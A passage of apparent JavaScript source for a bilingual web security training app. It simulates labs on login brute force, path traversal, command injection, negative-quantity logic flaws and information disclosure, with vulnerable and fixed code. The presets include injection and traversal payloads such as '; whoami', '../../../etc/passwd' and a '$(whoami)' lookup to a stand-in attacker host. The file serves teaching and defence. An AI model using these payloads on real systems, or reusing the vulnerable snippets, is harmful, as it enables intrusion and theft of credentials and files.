import { ATTACKER, L, actor, msg, verdict } from './helpers.js';

const APP = (sub = 'shop.example') => actor('app', L('Web app', 'Web 应用'), sub, 'neutral');

/* ---------------------------------------------------------------- auth */
const USERS = { admin: 'Tr0ub4dor&3', alice: 'wonderland', carlos: 'montoya' };
const auth = {
  tldr: L(
    'Authentication bugs let attackers log in as someone else: guessable credentials, login forms that leak which usernames exist, missing rate limits, and broken password reset or MFA flows.',
    '身份认证漏洞让攻击者能以他人身份登录：可猜测的凭据、泄露用户名是否存在的登录表单、缺失的限速，以及有缺陷的密码重置或 MFA 流程。',
  ),
  labTitle: L('Enumerate usernames, then brute-force', '先枚举用户名，再暴力破解'),
  lab: {
    fields: [
      { id: 'u', label: L('Username', '用户名'), default: 'carlos' },
      { id: 'p', label: L('Password', '密码'), default: 'letmein' },
      { id: 'n', label: L('Attempts sent (simulated)', '已发送的尝试次数（模拟）'), default: '1' },
    ],
    presets: [
      { label: L('Unknown user', '不存在的用户'), values: { u: 'zorro', p: 'letmein', n: '1' } },
      { label: L('Real user, wrong password', '存在的用户，密码错误'), values: { u: 'carlos', p: 'letmein', n: '1' } },
      { label: L('100-word wordlist', '100 个词的字典'), values: { u: 'carlos', p: 'montoya', n: '100' } },
    ],
    defense: { label: L('Login hardening', '登录加固'), off: L('Off', '关闭'), on: L('Generic errors + rate limit', '通用错误 + 限速') },
    run({ values, defended }) {
      const n = Math.max(1, parseInt(values.n, 10) || 1);
      const exists = Object.hasOwn(USERS, values.u);
      const correct = exists && USERS[values.u] === values.p;
      const request = `POST /login HTTP/1.1\nHost: shop.example\n\nusername=${values.u}&password=${values.p}`;
      if (defended && n > 5)
        return { request, log: [L(`🛡 ${n} attempts from this IP/account in 60s`, `🛡 60 秒内该 IP/账号尝试了 ${n} 次`), L('🛡 Account locked for 15 min, CAPTCHA required', '🛡 账号锁定 15 分钟，并要求验证码')], response: 'HTTP/1.1 429 Too Many Requests', ...verdict(false, 'Rate limiting stops the wordlist long before it reaches the right password.', '限速在字典试到正确密码之前就把它挡住了。') };
      if (correct)
        return { request, log: [L(`✓ user "${values.u}" found`, `✓ 找到用户 "${values.u}"`), L('✓ password hash matches', '✓ 密码哈希匹配')], response: 'HTTP/1.1 302 Found\nSet-Cookie: session=…\nLocation: /my-account', ...verdict(n > 1, n > 1 ? `Logged in as ${values.u} after ${n} guesses. Nothing slowed the attacker down.` : `Logged in as ${values.u}.`, n > 1 ? `猜了 ${n} 次后以 ${values.u} 登录，期间没有任何东西拖慢攻击者。` : `以 ${values.u} 登录。`) };
      const msgText = defended ? 'Invalid username or password' : exists ? 'Incorrect password' : 'Invalid username';
      return {
        request,
        log: [exists ? L(`user "${values.u}" exists → compare hash (slow)`, `用户 "${values.u}" 存在 → 比对哈希（较慢）`) : L(`user "${values.u}" not found → return early (fast)`, `用户 "${values.u}" 不存在 → 提前返回（较快）`)],
        response: `HTTP/1.1 200 OK\n\n<p class="error">${msgText}</p>`,
        ...(defended
          ? verdict(false, 'Same message for both cases: the attacker learns nothing about which usernames exist.', '两种情况返回同样的信息：攻击者无法得知哪些用户名存在。')
          : verdict(true, exists ? '“Incorrect password” confirms this username exists. The attacker can now focus the brute force on it.' : '“Invalid username”: the attacker crosses this name off the list. Compare with a real user.', exists ? '“密码错误”证实了这个用户名存在，攻击者可以专心对它暴力破解。' : '“用户名无效”：攻击者把这个名字从名单上划掉。和存在的用户对比一下。')),
      };
    },
  },
  actors: [ATTACKER, APP(), actor('db', L('User store', '用户库'), 'users', 'amber')],
  flow: [
    msg('atk', 'app', 'POST /login  zorro / x', L('The attacker tries a username from a list of common names.', '攻击者从常见用户名列表里取一个来试。'), 'attack'),
    msg('app', 'db', 'SELECT … WHERE username=?', L('The app looks the user up.', '应用查询该用户。')),
    msg('app', 'atk', '“Invalid username”', L('A different message, status code, or even response time for unknown users is an oracle.', '对不存在的用户返回不同的信息、状态码，甚至不同的响应时间，都会成为“预言机”。'), 'attack'),
    msg('atk', 'app', 'POST /login  carlos / ×100', L('With a valid username confirmed, the attacker sprays a password list.', '确认了一个有效用户名后，攻击者开始用密码字典猛试。'), 'attack'),
    msg('app', 'atk', '302 → /my-account', L('No lockout or rate limit, so eventually one guess works.', '没有锁定也没有限速，总有一次能猜中。'), 'attack'),
  ],
  concepts: [
    { t: L('Credential stuffing', '撞库'), b: L('Reusing leaked email/password pairs from other breaches. Defeated by MFA and breached-password checks.', '复用其他泄露事件中的邮箱/密码组合。MFA 和泄露密码检测可以防御。') },
    { t: L('Broken password reset', '有缺陷的密码重置'), b: L('Predictable tokens, tokens that never expire, or reset links built from the Host header (see Host header attacks).', '可预测的令牌、永不过期的令牌，或者用 Host 头拼出来的重置链接（见 Host 头攻击）。') },
    { t: L('MFA bypass', 'MFA 绕过'), b: L('Skipping the second step by browsing straight to /my-account, or brute-forcing a 4-digit code without limits.', '直接访问 /my-account 跳过第二步，或者无限制地暴力破解 4 位验证码。') },
  ],
  code: {
    vuln: `user = db.find(username)
if not user:
    return "Invalid username"
if not check(password, user.hash):
    return "Incorrect password"`,
    fixed: `@limiter.limit("5/minute", key=ip_and_username)
def login(username, password):
    user = db.find(username)
    # compare against a dummy hash so timing is equal
    ok = check(password, user.hash if user else DUMMY_HASH)
    if not (user and ok):
        return "Invalid username or password"`,
  },
  defenses: [
    { title: L('Identical failures', '失败信息完全一致'), body: L('Same message, status code and timing whether the username exists or not.', '无论用户名是否存在，都返回相同的信息、状态码和响应时间。') },
    { title: L('Rate limiting and lockout', '限速与锁定'), body: L('Throttle per account and per IP, with exponential back-off or CAPTCHA.', '按账号和 IP 分别限速，配合指数退避或验证码。') },
    { title: L('MFA and strong hashing', 'MFA 与强哈希'), body: L('MFA makes guessed passwords useless; bcrypt/Argon2 makes stolen hashes expensive.', 'MFA 让猜中的密码失去作用；bcrypt/Argon2 让被盗哈希的破解成本很高。') },
  ],
  qa: [
    { q: L('How can response time leak whether a user exists?', '响应时间为什么会泄露用户是否存在？'), a: L('If the app only hashes the password when the user exists, real usernames take measurably longer. Always run the hash.', '如果应用只在用户存在时才计算密码哈希，真实用户名的响应会明显更慢。应该无论如何都计算一次哈希。') },
    { q: L('Is account lockout always a good idea?', '账号锁定一定是好主意吗？'), a: L('It can be abused to lock real users out (DoS). Prefer progressive delays, CAPTCHA and IP-based throttling alongside it.', '它可能被滥用来锁定真实用户（拒绝服务）。更好的做法是配合渐进延迟、验证码和基于 IP 的限速。') },
  ],
};

/* ------------------------------------------------------- path traversal */
const FS = {
  '/var/www/images/cat.png': '<binary PNG data>',
  '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ncarlos:x:1000:1000::/home/carlos:/bin/bash',
  '/var/www/app/.env': 'DB_PASSWORD=hunter2\nSECRET_KEY=8f2c…',
};
function normalize(path) {
  const out = [];
  for (const seg of path.split('/')) {
    if (seg === '' || seg === '.') continue;
    if (seg === '..') out.pop();
    else out.push(seg);
  }
  return '/' + out.join('/');
}
const pathTraversal = {
  tldr: L(
    'Path traversal (directory traversal) happens when user input becomes part of a file path. Sequences like ../ walk out of the intended folder and read, or sometimes write, arbitrary files.',
    '当用户输入成为文件路径的一部分时，就可能出现路径遍历（目录遍历）。../ 这样的序列能走出预期目录，读取（有时甚至写入）任意文件。',
  ),
  labTitle: L('Escape the images folder', '逃出图片目录'),
  lab: {
    fields: [{ id: 'f', label: L('filename parameter', 'filename 参数'), default: '../../../etc/passwd' }],
    presets: [
      { label: L('Normal image', '正常图片'), values: { f: 'cat.png' } },
      { label: '../../../etc/passwd', values: { f: '../../../etc/passwd' } },
      { label: L('App secrets', '应用密钥'), values: { f: '../app/.env' } },
      { label: L('Absolute path', '绝对路径'), values: { f: '/etc/passwd' } },
      { label: L('URL-encoded', 'URL 编码'), values: { f: '..%2f..%2f..%2fetc/passwd' } },
    ],
    defense: { label: L('Path handling', '路径处理'), off: L('Concatenate', '直接拼接'), on: L('Canonicalise + check base', '规范化 + 校验基目录') },
    run({ values, defended }) {
      let f = values.f;
      try {
        f = decodeURIComponent(f);
      } catch {
        /* keep */
      }
      const base = '/var/www/images';
      const joined = f.startsWith('/') ? f : `${base}/${f}`;
      const real = normalize(joined);
      const request = `GET /image?filename=${values.f} HTTP/1.1\nHost: shop.example`;
      const log = [`open("${joined}")`, L(`resolves to ${real}`, `实际解析为 ${real}`)];
      if (defended && !real.startsWith(base + '/'))
        return { request, log: [...log, L(`🛡 ${real} is outside ${base}/ → rejected`, `🛡 ${real} 不在 ${base}/ 之内 → 拒绝`)], response: 'HTTP/1.1 400 Bad Request', ...verdict(false, 'The canonical path is checked against the base directory, so every ../ trick fails.', '规范化后的路径会与基目录比较，所有 ../ 技巧都失效。') };
      const content = FS[real];
      if (!content) return { request, log: [...log, L('file not found', '文件不存在')], response: 'HTTP/1.1 404 Not Found', verdict: 'neutral', message: L('No such file. Count your ../ segments.', '文件不存在，数一数你的 ../ 有几层。') };
      const escaped = !real.startsWith(base + '/');
      return { request, log: [...log, escaped ? L(`⚠ read ${real}`, `⚠ 读取了 ${real}`) : L('✓ inside images folder', '✓ 在图片目录内')], response: `HTTP/1.1 200 OK\n\n${content}`, ...verdict(escaped, escaped ? `The server returned ${real}. Any file the web server user can read is exposed.` : 'A normal image request.', escaped ? `服务器返回了 ${real}。Web 服务进程能读到的任何文件都暴露了。` : '正常的图片请求。') };
    },
  },
  actors: [ATTACKER, APP(), actor('fs', L('File system', '文件系统'), '/', 'amber')],
  flow: [
    msg('atk', 'app', 'GET /image?filename=../../../etc/passwd', L('The image endpoint takes a filename from the query string.', '图片接口从查询字符串中获取文件名。'), 'attack'),
    msg('app', 'app', '"/var/www/images/" + filename', L('The app builds the path by concatenation: /var/www/images/../../../etc/passwd.', '应用通过拼接构造路径：/var/www/images/../../../etc/passwd。'), 'attack'),
    msg('app', 'fs', 'open(/etc/passwd)', L('The OS resolves each ../ by going up one directory, ending at /etc/passwd.', '操作系统把每个 ../ 解析为上一级目录，最终落到 /etc/passwd。'), 'attack'),
    msg('fs', 'app', 'root:x:0:0…', L('The file is readable by the web server user, so it opens fine.', 'Web 服务进程有权读取该文件，于是顺利打开。')),
    msg('app', 'atk', '200 OK + file contents', L('The response contains the file. Next targets: config files, source code, keys.', '响应里包含了文件内容。下一步目标：配置文件、源代码、密钥。'), 'attack'),
  ],
  code: {
    vuln: `app.get('/image', (req, res) => {
  res.sendFile('/var/www/images/' + req.query.filename);
});`,
    fixed: `const BASE = path.resolve('/var/www/images');
app.get('/image', (req, res) => {
  const p = path.resolve(BASE, req.query.filename);
  if (!p.startsWith(BASE + path.sep)) return res.sendStatus(400);
  res.sendFile(p);
});`,
  },
  defenses: [
    { title: L('Avoid user-supplied paths', '避免使用用户提供的路径'), body: L('Map an ID to a file server-side (image 42 → cat.png) instead of accepting filenames.', '在服务器端把 ID 映射到文件（图片 42 → cat.png），而不是直接接受文件名。') },
    { title: L('Canonicalise, then check', '先规范化，再校验'), body: L('Resolve the full path (realpath) and verify it still starts with the base directory. Stripping ../ is bypassable (....//).', '解析出完整路径（realpath），再确认它仍以基目录开头。简单删除 ../ 可以被绕过（....//）。') },
    { title: L('Least privilege', '最小权限'), body: L('Run the app as a user that cannot read secrets, or inside a container with a minimal filesystem.', '用无法读取敏感文件的用户运行应用，或放在文件系统精简的容器中。') },
  ],
  qa: [
    { q: L('Why is filtering out "../" not enough?', '为什么过滤掉 "../" 还不够？'), a: L('Non-recursive stripping turns ....// into ../; encodings like %2e%2e%2f or double encoding slip past; absolute paths need no ../ at all.', '非递归删除会把 ....// 变成 ../；%2e%2e%2f 或双重编码能绕过过滤；绝对路径根本不需要 ../。') },
    { q: L('What is the Windows equivalent?', 'Windows 下有什么不同？'), a: L('Both ../ and ..\\ work, and targets differ, e.g. C:\\Windows\\win.ini.', '../ 和 ..\\ 都可以用，目标文件也不同，比如 C:\\Windows\\win.ini。') },
  ],
};

/* ------------------------------------------------------ command injection */
function splitShell(cmd) {
  // Very small shell model: split on ; && || | and newline, plus $( ) and backticks.
  const subs = [...cmd.matchAll(/\$\(([^)]*)\)|`([^`]*)`/g)].map((m) => (m[1] ?? m[2]).trim());
  const parts = cmd.replace(/\$\([^)]*\)|`[^`]*`/g, '…').split(/;|&&|\|\||\||\n/).map((s) => s.trim()).filter(Boolean);
  return { parts, subs };
}
const FAKE = { whoami: 'www-data', id: 'uid=33(www-data) gid=33(www-data)', 'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\n…', 'ls': 'app.py  config.yml  static' };
const cmdi = {
  tldr: L(
    'OS command injection happens when an app passes user input to a system shell. Shell metacharacters such as ; | && and $() let the attacker run their own commands on the server.',
    '当应用把用户输入传给系统 shell 时，就可能出现操作系统命令注入。; | && $() 这类 shell 元字符能让攻击者在服务器上执行自己的命令。',
  ),
  labTitle: L('Inject into a ping tool', '向 ping 工具注入命令'),
  lab: {
    fields: [{ id: 'h', label: L('Host to ping', '要 ping 的主机'), default: '8.8.8.8; whoami' }],
    presets: [
      { label: L('Normal host', '正常主机'), values: { h: '8.8.8.8' } },
      { label: '; whoami', values: { h: '8.8.8.8; whoami' } },
      { label: '&& cat /etc/passwd', values: { h: '8.8.8.8 && cat /etc/passwd' } },
      { label: '| id', values: { h: 'x | id' } },
      { label: '$(whoami)', values: { h: '$(whoami).attacker.example' } },
    ],
    defense: { label: L('How the command runs', '命令如何执行'), off: L('shell=True string', 'shell 字符串'), on: L('execFile + validation', 'execFile + 校验') },
    run({ values, defended }) {
      const h = values.h;
      const cmd = `ping -c 1 ${h}`;
      if (defended) {
        const ok = /^[a-zA-Z0-9.-]{1,253}$/.test(h);
        return {
          request: `POST /tools/ping\n\nhost=${h}`,
          log: [`execFile("ping", ["-c", "1", ${JSON.stringify(h)}])`, ok ? L('✓ host matches ^[a-zA-Z0-9.-]+$', '✓ 主机名匹配 ^[a-zA-Z0-9.-]+$') : L('🛡 invalid characters → rejected before running anything', '🛡 含非法字符 → 执行前就被拒绝')],
          response: ok ? 'PING 8.8.8.8: 1 packets transmitted, 1 received' : 'HTTP/1.1 400 Bad Request',
          ...verdict(false, 'No shell is involved: the input is a single argv entry, so ; and $() are just characters.', '整个过程没有 shell 参与：输入只是一个 argv 参数，; 和 $() 只是普通字符。'),
        };
      }
      const { parts, subs } = splitShell(cmd);
      const log = [`sh -c "${cmd}"`];
      subs.forEach((s) => log.push(L(`⚠ command substitution runs: ${s} → ${FAKE[s] ?? '?'}`, `⚠ 命令替换被执行：${s} → ${FAKE[s] ?? '?'}`)));
      parts.forEach((p, i) => log.push(i === 0 ? `#1 ${p}` : L(`⚠ #${i + 1} ${p}`, `⚠ 第 ${i + 1} 条：${p}`)));
      const extra = parts.slice(1).map((p) => FAKE[p] ?? `sh: ${p.split(' ')[0]}: output…`);
      const injected = parts.length > 1 || subs.length > 0;
      return {
        request: `POST /tools/ping\n\nhost=${h}`,
        log,
        response: [parts[0].includes('ping') ? 'PING …' : '', ...extra].filter(Boolean).join('\n'),
        ...verdict(injected, injected ? `The shell ran ${parts.length - 1 + subs.length} extra command(s) as www-data.` : 'Only ping ran.', injected ? `shell 以 www-data 身份额外执行了 ${parts.length - 1 + subs.length} 条命令。` : '只执行了 ping。'),
      };
    },
  },
  actors: [ATTACKER, APP('router admin panel'), actor('sh', L('Shell', 'Shell'), '/bin/sh', 'amber')],
  flow: [
    msg('atk', 'app', 'host=8.8.8.8; whoami', L('The diagnostics page asks for a host to ping.', '诊断页面要求输入一个要 ping 的主机。'), 'attack'),
    msg('app', 'app', '"ping -c 1 " + host', L('The app builds one command string.', '应用拼出一条命令字符串。'), 'attack'),
    msg('app', 'sh', 'sh -c "ping -c 1 8.8.8.8; whoami"', L('The shell parses the string. ; ends the first command, so whoami becomes a second one.', 'shell 解析这个字符串。; 结束了第一条命令，于是 whoami 成了第二条。'), 'attack'),
    msg('sh', 'app', 'PING… \\n www-data', L('Both outputs come back.', '两条命令的输出都返回了。')),
    msg('app', 'atk', 'output shown on page', L('If output is shown, it is in-band. If not, the attacker uses time delays (sleep 10) or DNS lookups to an attacker domain (blind).', '如果页面显示输出，就是回显型；如果不显示，攻击者会用时间延迟（sleep 10）或向攻击者域名发 DNS 请求（盲注）。'), 'attack'),
  ],
  code: {
    vuln: `import subprocess
out = subprocess.check_output(
    "ping -c 1 " + host, shell=True)`,
    fixed: `import re, subprocess
if not re.fullmatch(r"[A-Za-z0-9.-]{1,253}", host):
    abort(400)
out = subprocess.run(["ping", "-c", "1", "--", host],
                     capture_output=True, timeout=5)`,
  },
  defenses: [
    { title: L('Don’t call the shell', '不要调用 shell'), body: L('Use a library (e.g. an ICMP or DNS library) or an exec API with an argument array, never a command string.', '使用库（比如 ICMP 或 DNS 库）或者带参数数组的 exec API，绝不拼命令字符串。') },
    { title: L('Strict allow-list validation', '严格的白名单校验'), body: L('Validate against a tight pattern (a hostname, an integer), not a blocklist of bad characters.', '用严格的格式校验（主机名、整数），而不是黑名单过滤危险字符。') },
    { title: L('Use -- and least privilege', '使用 -- 与最小权限'), body: L('Even with argv, a value like -oProxyCommand=… can be an option. Pass -- first, and run as an unprivileged user.', '即使用 argv，-oProxyCommand=… 这样的值也可能被当作选项。先传 --，并以低权限用户运行。') },
  ],
  qa: [
    { q: L('How do you detect blind command injection?', '如何发现盲命令注入？'), a: L('Time-based (; sleep 10), output redirection to a web-readable file, or out-of-band DNS/HTTP lookups to a server you control.', '基于时间（; sleep 10）、把输出重定向到可通过 Web 访问的文件，或向你控制的服务器发起带外 DNS/HTTP 请求。') },
    { q: L('Is escaping with shlex.quote / escapeshellarg safe?', '用 shlex.quote / escapeshellarg 转义安全吗？'), a: L('It prevents metacharacter injection, but argument injection (values starting with -) can remain. Avoiding the shell is still better.', '它能防止元字符注入，但参数注入（以 - 开头的值）仍可能存在。避免使用 shell 仍然是更好的做法。') },
  ],
};

/* --------------------------------------------------------- business logic */
const logic = {
  tldr: L(
    'Logic flaws are mistakes in the rules of the application, not in parsing input. The code does exactly what it says, but the designers assumed users would only follow the happy path.',
    '逻辑漏洞是应用规则本身的错误，而不是解析输入的问题。代码完全按写的那样运行，只是设计者假设用户只会走“正常流程”。',
  ),
  labTitle: L('Buy a $1337 jacket for less than nothing', '用负数价格买 $1337 的夹克'),
  lab: {
    fields: [
      { id: 'q1', label: L('Jacket quantity ($1337.00)', '夹克数量（$1337.00）'), default: '1' },
      { id: 'q2', label: L('Socks quantity ($12.50)', '袜子数量（$12.50）'), default: '-106' },
    ],
    presets: [
      { label: L('Normal cart', '正常购物车'), values: { q1: '1', q2: '2' } },
      { label: L('Negative socks', '负数袜子'), values: { q1: '1', q2: '-106' } },
      { label: L('Integer overflow', '整数溢出'), values: { q1: '32123', q2: '98' } },
    ],
    defense: { label: L('Server-side rules', '服务器端规则'), off: L('Trust the client', '信任客户端'), on: L('Validate on server', '服务器端校验') },
    run({ values, defended }) {
      const q1 = parseInt(values.q1, 10) || 0;
      const q2 = parseInt(values.q2, 10) || 0;
      const credit = 100;
      const request = `POST /cart\n\nitems=[{"id":"jacket","qty":${q1}},{"id":"socks","qty":${q2}}]`;
      if (defended && (q1 < 0 || q2 < 0 || q1 > 99 || q2 > 99))
        return { request, log: [L('🛡 quantity must be 1–99', '🛡 数量必须在 1–99 之间')], response: 'HTTP/1.1 400 Bad Request', ...verdict(false, 'The server enforces the business rule itself.', '服务器自己执行业务规则。') };
      let cents = q1 * 133700 + q2 * 1250;
      const log = [`total = ${q1} × 1337.00 + ${q2} × 12.50`];
      // simulate a 32-bit signed integer in cents
      const wrapped = ((cents + 2 ** 31) % 2 ** 32 + 2 ** 32) % 2 ** 32 - 2 ** 31;
      if (wrapped !== cents) log.push(L(`⚠ 32-bit int overflow: ${cents} → ${wrapped} cents`, `⚠ 32 位整数溢出：${cents} → ${wrapped} 分`));
      cents = wrapped;
      const total = cents / 100;
      log.push(`store credit = $${credit}.00`);
      const ok = total <= credit;
      const cheated = ok && q1 >= 1 && total < 1337;
      return {
        request,
        log: [...log, ok ? L(`✓ $${total.toFixed(2)} ≤ $100 credit → order placed`, `✓ $${total.toFixed(2)} ≤ $100 余额 → 下单成功`) : L(`$${total.toFixed(2)} > $100 credit → declined`, `$${total.toFixed(2)} > $100 余额 → 拒绝`)],
        response: ok ? `Order confirmed. Total: $${total.toFixed(2)}` : 'Not enough store credit',
        ...(cheated ? verdict(true, `You got the jacket for $${total.toFixed(2)}. No injection, just abusing the rules.`, `你只花 $${total.toFixed(2)} 就买到了夹克。没有注入，只是钻了规则的空子。`) : { verdict: 'neutral', message: L('Normal behaviour. Try making the total small.', '正常行为。试着把总价变小。') }),
      };
    },
  },
  actors: [ATTACKER, APP(), actor('pay', L('Checkout', '结算'), 'credit check', 'amber')],
  flow: [
    msg('atk', 'app', 'POST /cart  jacket ×1', L('Add the expensive item normally.', '正常加入昂贵商品。')),
    msg('atk', 'app', 'POST /cart  socks ×-106', L('The quantity field is only restricted by the HTML input (min=1). Intercepting the request removes that.', '数量字段只靠 HTML 输入框（min=1）限制，拦截请求就能绕过。'), 'attack'),
    msg('app', 'pay', 'total = $12.00', L('The server adds up the lines, including the negative one.', '服务器把各行相加，包括那一行负数。'), 'attack'),
    msg('pay', 'app', '$12 ≤ $100 ✓', L('The credit check passes. Each component behaves “correctly”.', '余额检查通过。每个组件都表现得“正确”。')),
    msg('app', 'atk', 'Order confirmed', L('The flaw is in the assumption that quantities are always positive.', '漏洞在于“数量永远是正数”这个假设。'), 'attack'),
  ],
  concepts: [
    { t: L('Client-side only controls', '只在客户端做的限制'), b: L('Disabled buttons, hidden fields and JS validation are suggestions. Everything can be replayed with Burp or curl.', '禁用的按钮、隐藏字段、JS 校验都只是“建议”，用 Burp 或 curl 都能随意重放。') },
    { t: L('Skipping steps', '跳过步骤'), b: L('Jumping straight to /checkout/confirm, or replaying a step out of order in a multi-step flow.', '直接访问 /checkout/confirm，或在多步流程中乱序重放某一步。') },
    { t: L('Inconsistent rules', '规则不一致'), b: L('A coupon that can be stacked by alternating two codes, or an email change that skips verification.', '交替使用两张优惠码就能叠加优惠，或修改邮箱时跳过验证。') },
  ],
  code: {
    vuln: `total = sum(item.price * item.qty for item in cart)
if total <= user.credit:
    place_order(cart)`,
    fixed: `for item in cart:
    if not 1 <= item.qty <= 99:
        raise ValidationError("bad quantity")
total = sum(Decimal(item.price) * item.qty for item in cart)
if total <= 0 or total > user.credit:
    raise PaymentError()`,
  },
  defenses: [
    { title: L('Enforce rules server-side', '在服务器端执行规则'), body: L('Every assumption (positive quantity, one coupon, step order) must be checked by the server.', '每个假设（数量为正、只能用一张券、步骤顺序）都必须由服务器检查。') },
    { title: L('Write down the invariants', '写下不变量'), body: L('“Total must be ≥ 0”, “balance never negative”. Assert them and test them, including with abuse cases.', '“总价必须 ≥ 0”、“余额永不为负”。断言它们，并用滥用场景测试它们。') },
    { title: L('Use safe numeric types', '使用安全的数值类型'), body: L('Decimal for money, explicit bounds, and checks for overflow.', '金额用 Decimal，设定明确上下限，并检查溢出。') },
  ],
  qa: [
    { q: L('Why do scanners rarely find logic flaws?', '为什么扫描器很少发现逻辑漏洞？'), a: L('There is no malformed input or error signature: the requests are valid. Finding them needs understanding of what the business intends.', '这里没有畸形输入，也没有错误特征：请求都是合法的。要发现它们，必须理解业务本来的意图。') },
    { q: L('Give an example of a logic flaw in authentication.', '举一个身份认证中逻辑漏洞的例子。'), a: L('Password reset that takes the username from a hidden form field, so the attacker changes it to the victim’s.', '密码重置时从隐藏表单字段读取用户名，攻击者把它改成受害者的用户名即可。') },
  ],
};

/* ---------------------------------------------------- information disclosure */
const LEAKS = {
  "/product?id='": { code: 500, body: 'Traceback (most recent call last):\n  File "/srv/shop/app.py", line 88, in product\n    cur.execute("SELECT * FROM products WHERE id=" + id)\npsycopg2.errors.SyntaxError: unterminated quoted string\n\nDjango 2.1.4 · Python 3.6.9 · DEBUG = True', en: 'A verbose error reveals file paths, the raw SQL (and an injection point), and outdated framework versions.', zh: '详细的错误页泄露了文件路径、原始 SQL（以及一个注入点）和过时的框架版本。' },
  '/.git/config': { code: 200, body: '[remote "origin"]\n  url = https://deploy:ghp_x7Kq…@github.com/shop/shop-backend.git', en: 'The .git folder was deployed. The whole source history, and here a token, can be downloaded.', zh: '.git 目录被一起部署了。整个源码历史都能被下载，这里还带着一个令牌。' },
  '/robots.txt': { code: 200, body: 'User-agent: *\nDisallow: /backup/\nDisallow: /admin-7f3a/', en: 'robots.txt is a map of things the owner did not want indexed: a good first stop.', zh: 'robots.txt 是站长不希望被索引的内容清单，是侦察的好起点。' },
  '/backup/app.py~': { code: 200, body: 'DB_PASSWORD = "Sup3rS3cret!"\nSTRIPE_KEY  = "sk_live_51H…"', en: 'An editor backup file is served as plain text instead of being executed, leaking hard-coded secrets.', zh: '编辑器生成的备份文件被当作纯文本返回而没有被执行，泄露了硬编码的密钥。' },
  '/product?id=1': { code: 200, body: '<h1>Lightweight jacket</h1>', en: 'Normal response.', zh: '正常响应。' },
};
const infoDisclosure = {
  tldr: L(
    'Information disclosure is any leak of data the user should not see: other users’ data, secrets, or technical details (versions, paths, source code) that make other attacks far easier.',
    '信息泄露是指任何本不该让用户看到的数据被暴露：其他用户的数据、密钥，或者让其他攻击变得容易得多的技术细节（版本、路径、源代码）。',
  ),
  labTitle: L('Probe for leaks', '探测泄露点'),
  lab: {
    fields: [{ id: 'p', label: L('Path to request', '请求路径'), default: "/product?id='" }],
    presets: Object.keys(LEAKS).map((p) => ({ label: p, values: { p } })),
    defense: { label: L('Production hardening', '生产环境加固'), off: L('Off', '关闭'), on: L('On', '开启') },
    run({ values, defended }) {
      const hit = LEAKS[values.p];
      const request = `GET ${values.p} HTTP/1.1\nHost: shop.example`;
      if (!hit) return { request, log: [], response: 'HTTP/1.1 404 Not Found', verdict: 'neutral', message: L('Nothing here. Try a preset.', '这里什么都没有，试试预设。') };
      if (defended && values.p !== '/product?id=1') {
        const map = {
          "/product?id='": ['HTTP/1.1 500 Internal Server Error\n\nSomething went wrong. Reference: 7f3a9c', L('🛡 DEBUG=False; details go to the log, users see a reference ID', '🛡 DEBUG=False；详情写进日志，用户只看到一个参考编号')],
          '/robots.txt': ['HTTP/1.1 200 OK\n\nUser-agent: *\nDisallow:', L('🛡 sensitive paths are protected by auth, not hidden in robots.txt', '🛡 敏感路径靠认证保护，而不是藏在 robots.txt 里')],
        }[values.p] || ['HTTP/1.1 404 Not Found', L('🛡 build artefacts and dotfiles are not deployed', '🛡 构建产物和隐藏文件不会被部署')];
        return { request, log: [map[1]], response: map[0], ...verdict(false, 'Nothing useful leaks.', '没有任何有用的信息泄露。') };
      }
      const bad = values.p !== '/product?id=1';
      return { request, log: bad ? [L('⚠ sensitive information in response', '⚠ 响应中含有敏感信息')] : [], response: `HTTP/1.1 ${hit.code}\n\n${hit.body}`, ...verdict(bad, hit.en, hit.zh) };
    },
  },
  actors: [ATTACKER, APP(), actor('src', L('Server files', '服务器文件'), 'deploy dir', 'amber')],
  flow: [
    msg('atk', 'app', "GET /product?id='", L('Send unexpected input to trigger an error.', '发送非预期的输入来触发错误。'), 'attack'),
    msg('app', 'atk', '500 + stack trace', L('Debug mode is on: framework, version, file paths and the SQL query are all revealed.', '调试模式开着：框架、版本、文件路径和 SQL 语句全被暴露了。'), 'attack'),
    msg('atk', 'app', 'GET /.git/config', L('Look for files that should never have been deployed.', '寻找本不该被部署的文件。'), 'attack'),
    msg('app', 'src', 'serve static file', L('The web server happily serves anything in the folder.', 'Web 服务器乐于返回目录里的任何文件。')),
    msg('app', 'atk', 'repo URL + token', L('Each leak is a stepping stone: versions → known CVEs, source → hidden endpoints, keys → direct access.', '每一处泄露都是垫脚石：版本 → 已知 CVE，源码 → 隐藏接口，密钥 → 直接访问。'), 'attack'),
  ],
  code: {
    vuln: `# settings.py
DEBUG = True
# deploy.sh
rsync -a ./ server:/var/www/shop/`,
    fixed: `# settings.py
DEBUG = False
# deploy.sh: ship only the build output
rsync -a --exclude='.git' --exclude='*~' \\
      dist/ server:/var/www/shop/`,
  },
  defenses: [
    { title: L('Generic error pages', '通用错误页'), body: L('Log details server-side and return a correlation ID. Never DEBUG=True in production.', '详情记录在服务器端日志，只返回一个关联 ID。生产环境绝不能 DEBUG=True。') },
    { title: L('Deploy only what is needed', '只部署需要的东西'), body: L('Build artefacts, not working directories. Block dotfiles and backups at the web server.', '部署构建产物，而不是工作目录。在 Web 服务器层屏蔽隐藏文件和备份文件。') },
    { title: L('Strip version banners', '去掉版本标识'), body: L('Remove Server and X-Powered-By headers and default pages; keep software patched anyway.', '移除 Server、X-Powered-By 头和默认页面；当然软件也要及时打补丁。') },
  ],
  qa: [
    { q: L('Is a version number in a header really a vulnerability?', '响应头里有版本号真的算漏洞吗？'), a: L('On its own it is low severity, but it tells an attacker exactly which public exploits to try. It is about reducing reconnaissance.', '单独来看严重程度很低，但它告诉攻击者该试哪些公开漏洞利用。关键是减少攻击者的侦察信息。') },
    { q: L('Where else do secrets leak?', '密钥还会从哪里泄露？'), a: L('JavaScript bundles, source maps, git history, public S3 buckets, CI logs, and error-tracking tools.', 'JavaScript 打包文件、source map、git 历史、公开的 S3 存储桶、CI 日志以及错误追踪工具。') },
  ],
};

/* ---------------------------------------------------------- access control */
const INVOICES = { 1001: { owner: 'carlos', text: 'Invoice #1001 · Carlos Montoya · 42 Rose St · $2,180.00' }, 1002: { owner: 'alice', text: 'Invoice #1002 · Alice · 7 Wonder Ln · $64.90' }, 1003: { owner: 'admin', text: 'Invoice #1003 · Admin · internal · $0.00' } };
const accessControl = {
  tldr: L(
